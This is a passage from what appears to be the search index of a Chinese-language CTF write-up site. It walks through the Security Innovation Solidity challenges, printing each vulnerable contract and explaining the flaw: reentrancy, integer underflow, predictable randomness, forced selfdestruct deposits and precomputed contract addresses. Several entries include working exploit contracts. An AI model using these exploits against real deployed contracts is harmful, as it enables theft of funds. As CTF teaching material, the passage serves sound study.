; piggyBalance = piggyBalance . add ( msg.value ); } function () external payable ctf { piggyBalance = piggyBalance . add ( msg.value ); } modifier onlyOwner (){ require ( msg.sender == owner , \"Unauthorized: Not Owner\" ); _ ; } function withdraw ( uint256 amount ) internal { piggyBalance = piggyBalance . sub ( amount ); msg.sender . transfer ( amount ); } function collectFunds ( uint256 amount ) public onlyOwner ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdraw ( amount ); } } contract CharliesPiggyBank is PiggyBank { uint256 public withdrawlCount ; constructor ( address _ctfLauncher , address _player ) public payable PiggyBank ( _ctfLauncher , _player , \"Charlie\" ) { withdrawlCount = 0 ; } function collectFunds ( uint256 amount ) public ctf { require ( amount <= piggyBalance , \"Insufficient Funds in Contract\" ); withdrawlCount = withdrawlCount . add ( 1 ); withdraw ( amount ); } } withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528 \u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1","title":"Piggy Bank"},{"location":"writeups/SecurityInnovation/#si-token-sale","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol import \"../StandardToken.sol\" ; contract SIToken is StandardToken { using SafeMath for uint256 ; string public name = \"SIToken\" ; string public symbol = \"SIT\" ; uint public decimals = 18 ; uint public INITIAL_SUPPLY = 1000 * ( 10 ** decimals ); constructor () public { totalSupply_ = INITIAL_SUPPLY ; balances [ this ] = INITIAL_SUPPLY ; } } contract SITokenSale is SIToken , CtfFramework { uint256 public feeAmount ; uint256 public etherCollection ; address public developer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { feeAmount = 10 szabo ; developer = msg.sender ; purchaseTokens ( msg.value ); } function purchaseTokens ( uint256 _value ) internal { require ( _value > 0 , \"Cannot Purchase Zero Tokens\" ); require ( _value < balances [ this ], \"Not Enough Tokens Available\" ); balances [ msg.sender ] += _value - feeAmount ; balances [ this ] -= _value ; balances [ developer ] += feeAmount ; etherCollection += msg.value ; } function () payable external ctf { purchaseTokens ( msg.value ); } // Allow users to refund their tokens for half price ;-) function refundTokens ( uint256 _value ) external ctf { require ( _value > 0 , \"Cannot Refund Zero Tokens\" ); transfer ( this , _value ); etherCollection -= _value / 2 ; msg.sender . transfer ( _value / 2 ); } function withdrawEther () external ctf { require ( msg.sender == developer , \"Unauthorized: Not Developer\" ); require ( balances [ this ] == 0 , \"Only Allowed Once Sale is Complete\" ); msg.sender . transfer ( etherCollection ); } } \u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a balances [ msg.sender ] += _value - feeAmount ; \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2 \u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection \u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86","title":"SI Token Sale"},{"location":"writeups/SecurityInnovation/#secure-bank","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract SimpleBank is CtfFramework { mapping ( address => uint256 ) public balances ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { balances [ msg.sender ] = msg.value ; } function deposit ( address _user ) public payable ctf { balances [ _user ] += msg.value ; } function withdraw ( address _user , uint256 _value ) public ctf { require ( _value <= balances [ _user ], \"Insufficient Balance\" ); balances [ _user ] -= _value ; msg.sender . transfer ( _value ); } function () public payable ctf { deposit ( msg.sender ); } } contract MembersBank is SimpleBank { mapping ( address => string ) public members ; constructor ( address _ctfLauncher , address _player ) public payable SimpleBank ( _ctfLauncher , _player ) { } function register ( address _user , string _username ) public ctf { members [ _user ] = _username ; } modifier isMember ( address _user ){ bytes memory username = bytes ( members [ _user ]); require ( username . length != 0 , \"Member Must First Register\" ); _ ; } function deposit ( address _user ) public payable isMember ( _user ) ctf { super . deposit ( _user ); } function withdraw ( address _user , uint256 _value ) public isMember ( _user ) ctf { super . withdraw ( _user , _value ); } } contract SecureBank is MembersBank { constructor ( address _ctfLauncher , address _player ) public payable MembersBank ( _ctfLauncher , _player ) { } function deposit ( address _user ) public payable ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( msg.value < 100 ether , \"Exceeding Account Limits\" ); require ( msg.value >= 1 ether , \"Does Not Satisfy Minimum Requirement\" ); super . deposit ( _user ); } function withdraw ( address _user , uint8 _value ) public ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( _value < 100 , \"Exceeding Account Limits\" ); require ( _value >= 1 , \"Does Not Satisfy Minimum Requirement\" ); super . withdraw ( _user , _value * 1 ether ); } function register ( address _user , string _username ) public ctf { require ( bytes ( _username ). length != 0 , \"Username Not Enough Characters\" ); require ( bytes ( _username ). length <= 20 , \"Username Too Many Characters\" ); super . register ( _user , _username ); } } \u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb \u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1 \u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047 SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570 \u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef","title":"Secure Bank"},{"location":"writeups/SecurityInnovation/#lottery","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Lottery is CtfFramework { using SafeMath for uint256 ; uint256 public totalPot ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { totalPot = totalPot . add ( msg.value ); } function () external payable ctf { totalPot = totalPot . add ( msg.value ); } function play ( uint256 _seed ) external payable ctf { require ( msg.value >= 1 finney , \"Insufficient Transaction Value\" ); totalPot = totalPot . add ( msg.value ); bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( msg.sender )); bytes32 target = keccak256 ( abi . encodePacked ( entropy ^ entropy2 )); bytes32 guess = keccak256 ( abi . encodePacked ( _seed )); if ( guess == target ){ //winner uint256 payout = totalPot ; totalPot = 0 ; msg.sender . transfer ( payout ); } } } \u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355 exp contract Exploit { Lottery challenge ; constructor ( address addr ) public { challenge = Lottery ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( this )); uint256 ans = uint256 ( entropy ^ entropy2 ); challenge . play . value ( msg.value )( ans ); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Lottery"},{"location":"writeups/SecurityInnovation/#heads-or-tails","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract HeadsOrTails is CtfFramework { using SafeMath for uint256 ; uint256 public gameFunds ; uint256 public cost ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { gameFunds = gameFunds . add ( msg.value ); cost = gameFunds . div ( 10 ); } function play ( bool _heads ) external payable ctf { require ( msg.value == cost , \"Incorrect Transaction Value\" ); require ( gameFunds >= cost . div ( 2 ), \"Insufficient Funds in Game Contract\" ); bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; if (( coinFlip == 1 && _heads ) || ( coinFlip == 0 && ! _heads )) { //win gameFunds = gameFunds . sub ( msg.value . div ( 2 )); msg.sender . transfer ( msg.value . mul ( 3 ). div ( 2 )); } else { //loser gameFunds = gameFunds . add ( msg.value ); } } } \u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether \u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d exp contract Exploit { HeadsOrTails challenge ; constructor ( address addr ) public { challenge = HeadsOrTails ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; for ( int i = 0 ; i < 20 ; i ++ ) { if ( coinFlip == 1 ) { challenge . play . value ( 0 . 1 ether )( true ); } else { challenge . play . value ( 0 . 1 ether )( false ); } } } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Heads or Tails"},{"location":"writeups/SecurityInnovation/#trust-fund","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract TrustFund is CtfFramework { using SafeMath for uint256 ; uint256 public allowancePerYear ; uint256 public startDate ; uint256 public numberOfWithdrawls ; bool public withdrewThisYear ; address public custodian ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { custodian = msg.sender ; allowancePerYear = msg.value . div ( 10 ); startDate = now ; } function checkIfYearHasPassed () internal { if ( now >= startDate + numberOfWithdrawls * 365 days ){ withdrewThisYear = false ; } } function withdraw () external ctf { require ( allowancePerYear > 0 , \"No Allowances Allowed\" ); checkIfYearHasPassed (); require ( ! withdrewThisYear , \"Already Withdrew This Year\" ); if ( msg.sender . call . value ( allowancePerYear )()){ withdrewThisYear = true ; numberOfWithdrawls = numberOfWithdrawls . add ( 1 ); } } function returnFunds () external payable ctf { require ( msg.value == allowancePerYear , \"Incorrect Transaction Value\" ); require ( withdrewThisYear == true , \"Cannot Return Funds Before Withdraw\" ); withdrewThisYear = false ; numberOfWithdrawls = numberOfWithdrawls . sub ( 1 ); } } \u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898 exp contract Exploit { TrustFund challenge ; constructor ( address addr ) public { challenge = TrustFund ( addr ); } function exp () public { challenge . withdraw (); } function () public payable { challenge . withdraw (); } function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Trust Fund"},{"location":"writeups/SecurityInnovation/#record-label","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Royalties { using SafeMath for uint256 ; address private collectionsContract ; address private artist ; address [] private receiver ; mapping ( address => uint256 ) private receiverToPercentOfProfit ; uint256 private percentRemaining ; uint256 public amountPaid ; constructor ( address _manager , address _artist ) public { collectionsContract = msg.sender ; artist = _artist ; receiver . push ( _manager ); receiverToPercentOfProfit [ _manager ] = 80 ; percentRemaining = 100 - receiverToPercentOfProfit [ _manager ]; } modifier isCollectionsContract () { require ( msg.sender == collectionsContract , \"Unauthorized: Not Collections Contract\" ); _ ; } modifier isArtist (){ require ( msg.sender == artist , \"Unauthorized: Not Artist\" ); _ ; } function addRoyaltyReceiver ( address _receiver , uint256 _percent ) external isArtist { require ( _percent < percentRemaining , \"Precent Requested Must Be Less Than Percent Remaining\" ); receiver . push ( _receiver ); receiverToPercentOfProfit [ _receiver ] = _percent ; percentRemaining = percentRemaining . sub ( _percent ); } function payoutRoyalties () public payable isCollectionsContract { for ( uint256 i = 0 ; i < receiver . length ; i ++ ){ address current = receiver [ i ]; uint256 payout = msg.value . mul ( receiverToPercentOfProfit [ current ]). div ( 100 ); amountPaid = amountPaid . add ( payout ); current . transfer ( payout ); } msg.sender . call . value ( msg.value - amountPaid )( bytes4 ( keccak256 ( \"collectRemainingFunds()\" ))); } function getLastPayoutAmountAndReset () external isCollectionsContract returns ( uint256 ){ uint256 ret = amountPaid ; amountPaid = 0 ; return ret ; } function () public payable isCollectionsContract { payoutRoyalties (); } } contract Manager { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function withdraw ( uint256 _balance ) public { owner . transfer ( _balance ); } function () public payable { // empty } } contract RecordLabel is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; address public royalties ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { royalties = new Royalties ( new Manager ( _ctfLauncher ), _player ); funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawFundsAndPayRoyalties ( uint256 _withdrawAmount ) external ctf { require ( _withdrawAmount <= funds , \"Insufficient Funds in Contract\" ); funds = funds . sub ( _withdrawAmount ); royalties . call . value ( _withdrawAmount )(); uint256 royaltiesPaid = Royalties ( royalties ). getLastPayoutAmountAndReset (); uint256 artistPayout = _withdrawAmount . sub ( royaltiesPaid ); msg.sender . transfer ( artistPayout ); } function collectRemainingFunds () external payable { require ( msg.sender == royalties , \"Unauthorized: Not Royalties Contract\" ); } } \u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86","title":"Record Label"},{"location":"writeups/SecurityInnovation/#slot-machine","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract SlotMachine is CtfFramework { using SafeMath for uint256 ; uint256 public winner ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { winner = 5 ether ; } function () external payable ctf { require ( msg.value == 1 szabo , \"Incorrect Transaction Value\" ); if ( address ( this ). balance >= winner ){ msg.sender . transfer ( address ( this ). balance ); } } } \u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo \u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 exp contract Exploit { address challenge ; constructor ( address addr ) public payable { challenge = addr ; } function exp () public { selfdestruct ( challenge ); } }","title":"Slot Machine"},{"location":"writeups/SecurityInnovation/#rainy-day-fund","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract DebugAuthorizer { bool public debugMode ; constructor () public payable { if ( address ( this ). balance == 1 . 337 ether ){ debugMode = true ; } } } contract RainyDayFund is CtfFramework { address public developer ; mapping ( address => bool ) public fundManagerEnabled ; DebugAuthorizer public debugAuthorizer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development debugAuthorizer = new DebugAuthorizer (); developer = msg.sender ; fundManagerEnabled [ msg.sender ] = true ; } modifier isManager () { require ( fundManagerEnabled [ msg.sender ] || debugAuthorizer . debugMode () || msg.sender == developer , \"Unauthorized: Not a Fund Manager\" ); _ ; } function () external payable ctf { // Anyone can add to the fund } function addFundManager ( address _newManager ) external isManager ctf { fundManagerEnabled [ _newManager ] = true ; } function removeFundManager ( address _previousManager ) external isManager ctf { fundManagerEnabled [ _previousManager ] = false ; } function withdraw () external isManager ctf { msg.sender . transfer ( address ( this ). balance ); } } \u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode \u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09 \u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw \u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a keccak ( rlp . encode ([ deployer , nonce ])) \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce \u5e94\u8be5\u662f 1 \u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a import rlp import web3 def calc_address ( deployer , nonce ): return web3 . Web3 . keccak ( rlp . encode ([ deployer , nonce ])) for nonce in range ( 1 , 1000000 ): if calc_address ( 0xeD0D5160c642492b3B482e006F67679F5b6223A2 , nonce ) . hex () . endswith ( \"66318f6b06fd5769fa310732566b13d92cfbc589\" ): print ( nonce ) break \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2 nonce = 485 challenge = int ( calc_address ( deployer , nonce ) . hex ()[ - 40 :], 16 ) print ( f \"next challenge address: { hex ( challenge ) } \" ) debug = int ( calc_address ( challenge , 1 ) . hex ()[ - 40 :], 16 ) print ( f \"next DebugAuthorizer address: { hex ( debug ) } \" ) \"\"\" next challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \"\"\" \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86","title":"Rainy Day Fund"},{"location":"writeups/SecurityInnovation/#raffle","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Raffle is CtfFramework { uint256 constant fee = 0 . 1 ether ; address private admin ; bytes4 private winningTicket ; uint256 private blocknum ; uint256 public ticketsBought ; bool public raffleStopped ; mapping ( address => uint256 ) private rewards ; mapping ( address => bool ) private potentialWinner ; mapping ( address => bytes4 ) private ticketNumbers ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { rewards [ address ( this )] = msg.value ; admin = msg.sender ; } function buyTicket () external payable ctf { if ( msg.value >= fee ){ winningTicket = bytes4 ( 0 ); blocknum = block.number + 1 ; ticketsBought += 1 ; raffleStopped = false ; rewards [ msg.sender ] += msg.value ; ticketNumbers [ msg.sender ] = bytes4 (( msg.value - fee ) / 10 ** 8 ); potentialWinner [ msg.sender ] = true ; } } function closeRaffle () external ctf { require ( ticketsBought > 0 ); require ( ! raffleStopped ); require ( blocknum != 0 ); require ( winningTicket == bytes4 ( 0 )); require ( block.number > blocknum ); require ( msg.sender == admin || rewards [ msg.sender ] > 0 ); winningTicket = bytes4 ( blockhash ( blocknum )); potentialWinner [ msg.sender ] = false ; raffleStopped = true ; } function collectReward () external payable ctf { require ( raffleStopped ); require ( potentialWinner [ msg.sender ]); rewards [ address ( this )] += msg.value ; if ( winningTicket == ticketNumbers [ msg.sender ]){ msg.sender . transfer ( rewards [ msg.sender ]); msg.sender . transfer ( rewards [ address ( this )]); rewards [ msg.sender ] = 0 ; rewards [ address ( this )] = 0 ; } } function skimALittleOffTheTop ( uint256 _value ) external ctf { require ( msg.sender == admin ); require ( rewards [ address ( this )] > _value ); rewards [ address ( this )] = rewards [ address ( this )] - _value ; msg.sender . transfer ( _value ); } function () 